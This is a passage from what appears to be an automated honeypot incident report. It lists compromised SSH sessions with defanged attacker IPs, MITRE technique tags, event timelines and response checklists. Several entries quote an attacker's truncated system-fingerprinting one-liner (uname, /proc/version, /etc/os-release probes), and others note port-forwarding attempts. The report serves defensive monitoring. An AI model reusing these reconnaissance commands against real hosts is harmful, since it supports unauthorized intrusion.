| `2026-08-29 12:54:33` | `cowrie.command.input` |
| `2026-08-29 12:54:34` | `cowrie.session.file_download` |
| `2026-08-29 12:54:34` | `cowrie.log.closed` |
| `2026-08-29 12:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.27.150[.]95` to AbuseIPDB if not already reported
- [ ] Block `118.27.150[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c07b07436ca

| Field | Detail |
|---|---|
| **Source IP** | `118.27.150[.]95` |
| **First Seen** | 2026-08-29 12:54 |
| **Last Seen** | 2026-08-29 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:54:34` | `cowrie.session.connect` |
| `2026-08-29 12:54:34` | `cowrie.client.version` |
| `2026-08-29 12:54:34` | `cowrie.client.kex` |
| `2026-08-29 12:54:35` | `cowrie.login.success` |
| `2026-08-29 12:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.27.150[.]95` to AbuseIPDB if not already reported
- [ ] Block `118.27.150[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d847c048801

| Field | Detail |
|---|---|
| **Source IP** | `118.27.150[.]95` |
| **First Seen** | 2026-08-29 12:54 |
| **Last Seen** | 2026-08-29 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:54:36` | `cowrie.session.connect` |
| `2026-08-29 12:54:36` | `cowrie.client.version` |
| `2026-08-29 12:54:36` | `cowrie.client.kex` |
| `2026-08-29 12:54:37` | `cowrie.login.success` |
| `2026-08-29 12:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.27.150[.]95` to AbuseIPDB if not already reported
- [ ] Block `118.27.150[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d610466580b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:56 |
| **Last Seen** | 2026-08-29 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:56:07` | `cowrie.session.connect` |
| `2026-08-29 12:56:07` | `cowrie.client.version` |
| `2026-08-29 12:56:07` | `cowrie.client.kex` |
| `2026-08-29 12:56:09` | `cowrie.login.success` |
| `2026-08-29 12:56:10` | `cowrie.session.params` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.success` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:10` | `cowrie.command.input` |
| `2026-08-29 12:56:11` | `cowrie.log.closed` |
| `2026-08-29 12:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a522c145d9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:56 |
| **Last Seen** | 2026-08-29 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:56:16` | `cowrie.session.connect` |
| `2026-08-29 12:56:16` | `cowrie.client.version` |
| `2026-08-29 12:56:16` | `cowrie.client.kex` |
| `2026-08-29 12:56:17` | `cowrie.login.success` |
| `2026-08-29 12:56:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:56:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:56:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ce43960868

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]158` |
| **First Seen** | 2026-08-29 12:57 |
| **Last Seen** | 2026-08-29 12:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:57:25` | `cowrie.session.connect` |
| `2026-08-29 12:57:26` | `cowrie.client.version` |
| `2026-08-29 12:57:26` | `cowrie.client.kex` |
| `2026-08-29 12:57:28` | `cowrie.login.success` |
| `2026-08-29 12:57:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]158` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a620789f4cd

| Field | Detail |
|---|---|
| **Source IP** | `112.29.68[.]22` |
| **First Seen** | 2026-08-29 12:57 |
| **Last Seen** | 2026-08-29 12:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:57:36` | `cowrie.session.connect` |
| `2026-08-29 12:57:37` | `cowrie.client.version` |
| `2026-08-29 12:57:37` | `cowrie.client.kex` |
| `2026-08-29 12:57:42` | `cowrie.login.success` |
| `2026-08-29 12:57:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.29.68[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.29.68[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7629deb60599

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:57 |
| **Last Seen** | 2026-08-29 12:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:57:44` | `cowrie.session.connect` |
| `2026-08-29 12:57:44` | `cowrie.client.version` |
| `2026-08-29 12:57:44` | `cowrie.client.kex` |
| `2026-08-29 12:57:46` | `cowrie.login.success` |
| `2026-08-29 12:57:48` | `cowrie.session.params` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.success` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.command.input` |
| `2026-08-29 12:57:48` | `cowrie.log.closed` |
| `2026-08-29 12:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04752e63b57b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:59 |
| **Last Seen** | 2026-08-29 12:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:59:25` | `cowrie.session.connect` |
| `2026-08-29 12:59:25` | `cowrie.client.version` |
| `2026-08-29 12:59:25` | `cowrie.client.kex` |
| `2026-08-29 12:59:28` | `cowrie.login.success` |
| `2026-08-29 12:59:29` | `cowrie.session.params` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.success` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:29` | `cowrie.command.input` |
| `2026-08-29 12:59:30` | `cowrie.log.closed` |
| `2026-08-29 12:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee548a11a53

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-08-29 13:00 |
| **Last Seen** | 2026-08-29 13:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:00:12` | `cowrie.session.connect` |
| `2026-08-29 13:00:13` | `cowrie.client.version` |
| `2026-08-29 13:00:13` | `cowrie.client.kex` |
| `2026-08-29 13:00:15` | `cowrie.login.success` |
| `2026-08-29 13:00:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb51ca4b55be

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-29 13:00 |
| **Last Seen** | 2026-08-29 13:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:00:25` | `cowrie.session.connect` |
| `2026-08-29 13:00:26` | `cowrie.client.version` |
| `2026-08-29 13:00:26` | `cowrie.client.kex` |
| `2026-08-29 13:00:29` | `cowrie.login.success` |
| `2026-08-29 13:00:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99029ed20d93

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-08-29 13:00 |
| **Last Seen** | 2026-08-29 13:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:00:39` | `cowrie.session.connect` |
| `2026-08-29 13:00:39` | `cowrie.client.version` |
| `2026-08-29 13:00:39` | `cowrie.client.kex` |
| `2026-08-29 13:00:40` | `cowrie.login.success` |
| `2026-08-29 13:00:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59023b8d17b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:01 |
| **Last Seen** | 2026-08-29 13:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:01:04` | `cowrie.session.connect` |
| `2026-08-29 13:01:05` | `cowrie.client.version` |
| `2026-08-29 13:01:05` | `cowrie.client.kex` |
| `2026-08-29 13:01:07` | `cowrie.login.success` |
| `2026-08-29 13:01:09` | `cowrie.session.params` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.success` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.command.input` |
| `2026-08-29 13:01:09` | `cowrie.log.closed` |
| `2026-08-29 13:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd8a69db7d6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:02 |
| **Last Seen** | 2026-08-29 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:02:07` | `cowrie.session.connect` |
| `2026-08-29 13:02:07` | `cowrie.client.version` |
| `2026-08-29 13:02:07` | `cowrie.client.kex` |
| `2026-08-29 13:02:08` | `cowrie.login.success` |
| `2026-08-29 13:02:08` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:02:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:02:08` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568d961e64dc

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-08-29 13:02 |
| **Last Seen** | 2026-08-29 13:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:02:26` | `cowrie.session.connect` |
| `2026-08-29 13:02:27` | `cowrie.client.version` |
| `2026-08-29 13:02:27` | `cowrie.client.kex` |
| `2026-08-29 13:02:29` | `cowrie.login.success` |
| `2026-08-29 13:02:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201df09f0041

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-29 13:02 |
| **Last Seen** | 2026-08-29 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:02:36` | `cowrie.session.connect` |
| `2026-08-29 13:02:36` | `cowrie.client.version` |
| `2026-08-29 13:02:36` | `cowrie.client.kex` |
| `2026-08-29 13:02:37` | `cowrie.login.success` |
| `2026-08-29 13:02:37` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5feddb3263a0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:02 |
| **Last Seen** | 2026-08-29 13:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:02:48` | `cowrie.session.connect` |
| `2026-08-29 13:02:48` | `cowrie.client.version` |
| `2026-08-29 13:02:48` | `cowrie.client.kex` |
| `2026-08-29 13:02:50` | `cowrie.login.success` |
| `2026-08-29 13:02:51` | `cowrie.session.params` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.success` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:51` | `cowrie.command.input` |
| `2026-08-29 13:02:52` | `cowrie.log.closed` |
| `2026-08-29 13:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4597e541578c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:04 |
| **Last Seen** | 2026-08-29 13:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:04:29` | `cowrie.session.connect` |
| `2026-08-29 13:04:30` | `cowrie.client.version` |
| `2026-08-29 13:04:30` | `cowrie.client.kex` |
| `2026-08-29 13:04:31` | `cowrie.login.success` |
| `2026-08-29 13:04:32` | `cowrie.session.params` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.success` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:32` | `cowrie.command.input` |
| `2026-08-29 13:04:33` | `cowrie.log.closed` |
| `2026-08-29 13:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf1a8a46395

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:06 |
| **Last Seen** | 2026-08-29 13:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:06:15` | `cowrie.session.connect` |
| `2026-08-29 13:06:15` | `cowrie.client.version` |
| `2026-08-29 13:06:15` | `cowrie.client.kex` |
| `2026-08-29 13:06:16` | `cowrie.login.success` |
| `2026-08-29 13:06:18` | `cowrie.session.params` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.success` |
